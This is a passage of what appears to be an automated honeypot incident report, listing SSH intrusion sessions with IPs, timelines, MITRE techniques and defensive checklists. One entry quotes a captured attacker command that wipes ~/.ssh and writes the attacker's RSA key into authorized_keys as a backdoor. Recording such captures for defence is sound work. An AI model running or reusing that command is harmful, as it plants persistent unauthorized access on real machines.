| **First Seen** | 2026-08-19 08:02 |
| **Last Seen** | 2026-08-19 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:02:47` | `cowrie.session.connect` |
| `2026-08-19 08:02:47` | `cowrie.client.version` |
| `2026-08-19 08:02:47` | `cowrie.client.kex` |
| `2026-08-19 08:02:47` | `cowrie.login.success` |
| `2026-08-19 08:02:48` | `cowrie.session.params` |
| `2026-08-19 08:02:48` | `cowrie.command.input` |
| `2026-08-19 08:02:48` | `cowrie.log.closed` |
| `2026-08-19 08:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d0778a4085

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-08-19 08:06 |
| **Last Seen** | 2026-08-19 08:12 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:06:58` | `cowrie.session.connect` |
| `2026-08-19 08:06:59` | `cowrie.client.version` |
| `2026-08-19 08:06:59` | `cowrie.client.kex` |
| `2026-08-19 08:07:00` | `cowrie.login.success` |
| `2026-08-19 08:07:00` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c9f6886063

| Field | Detail |
|---|---|
| **Source IP** | `60.220.241[.]50` |
| **First Seen** | 2026-08-19 08:07 |
| **Last Seen** | 2026-08-19 08:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:07:06` | `cowrie.session.connect` |
| `2026-08-19 08:07:07` | `cowrie.client.version` |
| `2026-08-19 08:07:07` | `cowrie.client.kex` |
| `2026-08-19 08:07:11` | `cowrie.login.success` |
| `2026-08-19 08:07:12` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.220.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.220.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390088effb20

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 08:08 |
| **Last Seen** | 2026-08-19 08:08 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:08:18` | `cowrie.session.connect` |
| `2026-08-19 08:08:20` | `cowrie.client.version` |
| `2026-08-19 08:08:20` | `cowrie.client.kex` |
| `2026-08-19 08:08:27` | `cowrie.login.success` |
| `2026-08-19 08:08:31` | `cowrie.session.params` |
| `2026-08-19 08:08:31` | `cowrie.command.input` |
| `2026-08-19 08:08:32` | `cowrie.log.closed` |
| `2026-08-19 08:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751b4a021407

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:08 |
| **Last Seen** | 2026-08-19 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:08:43` | `cowrie.session.connect` |
| `2026-08-19 08:08:43` | `cowrie.client.version` |
| `2026-08-19 08:08:43` | `cowrie.client.kex` |
| `2026-08-19 08:08:44` | `cowrie.login.success` |
| `2026-08-19 08:08:44` | `cowrie.session.params` |
| `2026-08-19 08:08:44` | `cowrie.command.input` |
| `2026-08-19 08:08:44` | `cowrie.log.closed` |
| `2026-08-19 08:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8fb208c025

| Field | Detail |
|---|---|
| **Source IP** | `158.69.60[.]127` |
| **First Seen** | 2026-08-19 08:10 |
| **Last Seen** | 2026-08-19 08:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:10:53` | `cowrie.session.connect` |
| `2026-08-19 08:10:53` | `cowrie.client.version` |
| `2026-08-19 08:10:53` | `cowrie.client.kex` |
| `2026-08-19 08:10:55` | `cowrie.login.success` |
| `2026-08-19 08:10:55` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.60[.]127` to AbuseIPDB if not already reported
- [ ] Block `158.69.60[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787be65fff31

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-08-19 08:12 |
| **Last Seen** | 2026-08-19 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:12:15` | `cowrie.session.connect` |
| `2026-08-19 08:12:16` | `cowrie.client.version` |
| `2026-08-19 08:12:16` | `cowrie.client.kex` |
| `2026-08-19 08:12:18` | `cowrie.login.success` |
| `2026-08-19 08:12:19` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd86b956f03d

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-19 08:12 |
| **Last Seen** | 2026-08-19 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:12:19` | `cowrie.session.connect` |
| `2026-08-19 08:12:20` | `cowrie.client.version` |
| `2026-08-19 08:12:20` | `cowrie.client.kex` |
| `2026-08-19 08:12:22` | `cowrie.login.success` |
| `2026-08-19 08:12:23` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946c5ba95b3b

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-19 08:12 |
| **Last Seen** | 2026-08-19 08:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:12:28` | `cowrie.session.connect` |
| `2026-08-19 08:12:28` | `cowrie.client.version` |
| `2026-08-19 08:12:28` | `cowrie.client.kex` |
| `2026-08-19 08:12:29` | `cowrie.login.success` |
| `2026-08-19 08:12:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4008f4763e

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-19 08:12 |
| **Last Seen** | 2026-08-19 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:12:28` | `cowrie.session.connect` |
| `2026-08-19 08:12:29` | `cowrie.client.version` |
| `2026-08-19 08:12:29` | `cowrie.client.kex` |
| `2026-08-19 08:12:32` | `cowrie.login.success` |
| `2026-08-19 08:12:33` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530dca597f2f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:14 |
| **Last Seen** | 2026-08-19 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:14:40` | `cowrie.session.connect` |
| `2026-08-19 08:14:40` | `cowrie.client.version` |
| `2026-08-19 08:14:40` | `cowrie.client.kex` |
| `2026-08-19 08:14:40` | `cowrie.login.success` |
| `2026-08-19 08:14:41` | `cowrie.session.params` |
| `2026-08-19 08:14:41` | `cowrie.command.input` |
| `2026-08-19 08:14:41` | `cowrie.log.closed` |
| `2026-08-19 08:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5492cf911221

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-08-19 08:14 |
| **Last Seen** | 2026-08-19 08:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:14:53` | `cowrie.session.connect` |
| `2026-08-19 08:14:54` | `cowrie.client.version` |
| `2026-08-19 08:14:54` | `cowrie.client.kex` |
| `2026-08-19 08:14:56` | `cowrie.login.success` |
| `2026-08-19 08:14:56` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe576cbb569c

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-19 08:15 |
| **Last Seen** | 2026-08-19 08:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:15:01` | `cowrie.session.connect` |
| `2026-08-19 08:15:02` | `cowrie.client.version` |
| `2026-08-19 08:15:02` | `cowrie.client.kex` |
| `2026-08-19 08:15:03` | `cowrie.login.success` |
| `2026-08-19 08:15:03` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fada0350bc28

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-08-19 08:15 |
| **Last Seen** | 2026-08-19 08:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:15:08` | `cowrie.session.connect` |
| `2026-08-19 08:15:09` | `cowrie.client.version` |
| `2026-08-19 08:15:09` | `cowrie.client.kex` |
| `2026-08-19 08:15:11` | `cowrie.login.success` |
| `2026-08-19 08:15:11` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff215e6fa92

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-08-19 08:15 |
| **Last Seen** | 2026-08-19 08:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:15:17` | `cowrie.session.connect` |
| `2026-08-19 08:15:18` | `cowrie.client.version` |
| `2026-08-19 08:15:18` | `cowrie.client.kex` |
| `2026-08-19 08:15:20` | `cowrie.login.success` |
| `2026-08-19 08:15:20` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a0358feb403

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 08:18 |
| **Last Seen** | 2026-08-19 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:18:21` | `cowrie.session.connect` |
| `2026-08-19 08:18:21` | `cowrie.client.version` |
| `2026-08-19 08:18:21` | `cowrie.client.kex` |
| `2026-08-19 08:18:22` | `cowrie.login.success` |
| `2026-08-19 08:18:22` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:18:22` | `cowrie.direct-tcpip.data` |
| `2026-08-19 08:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30476ddedbda

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:20 |
| **Last Seen** | 2026-08-19 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:20:36` | `cowrie.session.connect` |
| `2026-08-19 08:20:36` | `cowrie.client.version` |
| `2026-08-19 08:20:36` | `cowrie.client.kex` |
| `2026-08-19 08:20:36` | `cowrie.login.success` |
| `2026-08-19 08:20:37` | `cowrie.session.params` |
| `2026-08-19 08:20:37` | `cowrie.command.input` |
| `2026-08-19 08:20:37` | `cowrie.log.closed` |
| `2026-08-19 08:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee7e92b52404

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 08:20 |
| **Last Seen** | 2026-08-19 08:20 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:20:44` | `cowrie.session.connect` |
| `2026-08-19 08:20:45` | `cowrie.client.version` |
| `2026-08-19 08:20:45` | `cowrie.client.kex` |
| `2026-08-19 08:20:52` | `cowrie.login.success` |
| `2026-08-19 08:20:57` | `cowrie.session.params` |
| `2026-08-19 08:20:57` | `cowrie.command.input` |
| `2026-08-19 08:20:58` | `cowrie.log.closed` |
| `2026-08-19 08:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e88dbd5b65f

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-08-19 08:26 |
| **Last Seen** | 2026-08-19 08:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:26:27` | `cowrie.session.connect` |
| `2026-08-19 08:26:27` | `cowrie.client.version` |
| `2026-08-19 08:26:27` | `cowrie.client.kex` |
| `2026-08-19 08:26:28` | `cowrie.login.success` |
| `2026-08-19 08:26:29` | `cowrie.session.params` |
| `2026-08-19 08:26:29` | `cowrie.command.input` |
| `2026-08-19 08:26:29` | `cowrie.command.failed` |
| `2026-08-19 08:26:30` | `cowrie.log.closed` |
| `2026-08-19 08:26:31` | `cowrie.session.params` |
| `2026-08-19 08:26:31` | `cowrie.command.input` |
| `2026-08-19 08:26:31` | `cowrie.session.file_download` |
| `2026-08-19 08:26:31` | `cowrie.log.closed` |
| `2026-08-19 08:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4156a74040a

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-08-19 08:26 |
| **Last Seen** | 2026-08-19 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:26:31` | `cowrie.session.connect` |
| `2026-08-19 08:26:31` | `cowrie.client.version` |
| `2026-08-19 08:26:31` | `cowrie.client.kex` |
| `2026-08-19 08:26:33` | `cowrie.login.success` |
| `2026-08-19 08:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda4458e41fd

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:26 |
| **Last Seen** | 2026-08-19 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:26:32` | `cowrie.session.connect` |
| `2026-08-19 08:26:32` | `cowrie.client.version` |
| `2026-08-19 08:26:33` | `cowrie.client.kex` |
| `2026-08-19 08:26:33` | `cowrie.login.success` |
| `2026-08-19 08:26:34` | `cowrie.session.params` |
| `2026-08-19 08:26:34` | `cowrie.command.input` |
| `2026-08-19 08:26:34` | `cowrie.log.closed` |
| `2026-08-19 08:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118d77b30872

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-08-19 08:26 |
| **Last Seen** | 2026-08-19 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:26:34` | `cowrie.session.connect` |
| `2026-08-19 08:26:34` | `cowrie.client.version` |
| `2026-08-19 08:26:34` | `cowrie.client.kex` |
| `2026-08-19 08:26:35` | `cowrie.login.success` |
| `2026-08-19 08:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa95db6cca2

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:32 |
| **Last Seen** | 2026-08-19 08:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:32:29` | `cowrie.session.connect` |
| `2026-08-19 08:32:29` | `cowrie.client.version` |
| `2026-08-19 08:32:29` | `cowrie.client.kex` |
| `2026-08-19 08:32:29` | `cowrie.login.success` |
| `2026-08-19 08:32:30` | `cowrie.session.params` |
| `2026-08-19 08:32:30` | `cowrie.command.input` |
| `2026-08-19 08:32:30` | `cowrie.log.closed` |
| `2026-08-19 08:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df85b4c8a10f

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 08:33 |
| **Last Seen** | 2026-08-19 08:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:33:09` | `cowrie.session.connect` |
| `2026-08-19 08:33:11` | `cowrie.client.version` |
| `2026-08-19 08:33:11` | `cowrie.client.kex` |
| `2026-08-19 08:33:18` | `cowrie.login.success` |
| `2026-08-19 08:33:22` | `cowrie.session.params` |
| `2026-08-19 08:33:22` | `cowrie.command.input` |
| `2026-08-19 08:33:24` | `cowrie.log.closed` |
| `2026-08-19 08:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c6d5048190

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:38 |
| **Last Seen** | 2026-08-19 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:38:26` | `cowrie.session.connect` |
| `2026-08-19 08:38:26` | `cowrie.client.version` |
| `2026-08-19 08:38:26` | `cowrie.client.kex` |
| `2026-08-19 08:38:26` | `cowrie.login.success` |
| `2026-08-19 08:38:27` | `cowrie.session.params` |
| `2026-08-19 08:38:27` | `cowrie.command.input` |
| `2026-08-19 08:38:27` | `cowrie.log.closed` |
| `2026-08-19 08:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88921a25417f

